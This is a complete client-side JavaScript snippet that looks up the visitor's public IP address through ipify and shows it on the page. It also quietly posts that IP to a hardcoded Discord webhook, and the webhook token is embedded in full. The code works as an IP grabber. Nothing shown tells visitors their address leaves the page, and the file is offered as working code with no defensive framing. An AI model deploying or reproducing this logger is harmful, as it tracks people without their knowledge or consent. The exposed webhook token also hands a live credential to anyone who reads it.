const webhookUrl = "https://discord.com/api/webhooks/1280680137914056767/0ZD4U0jQWJ2MKHBzMYFRgcPQ0TgE9fgM4ZgWjYpV7GiFyZ9gFyqPnKU8HNORFA-uyX8D";

fetch("https://api.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
        const ipAddress = data.ip;
        document.getElementById("ip-address").textContent = ipAddress;

        // Send IP address to Discord webhook
        fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: `IP Address: ${ipAddress}`
            })
        })
        .then(response => {
            if (response.ok) {
                console.log("IP address sent to Discord webhook successfully.");
            } else {
                console.error("Failed to send IP address to Discord webhook.");
            }
        })
        .catch(error => {
            console.error("Error sending IP address to Discord webhook:", error);
        });
    })
    .catch(error => {
        console.error("Error fetching IP address:", error);
        document.getElementById("ip-address").textContent = "Unable to retrieve IP address.";
    });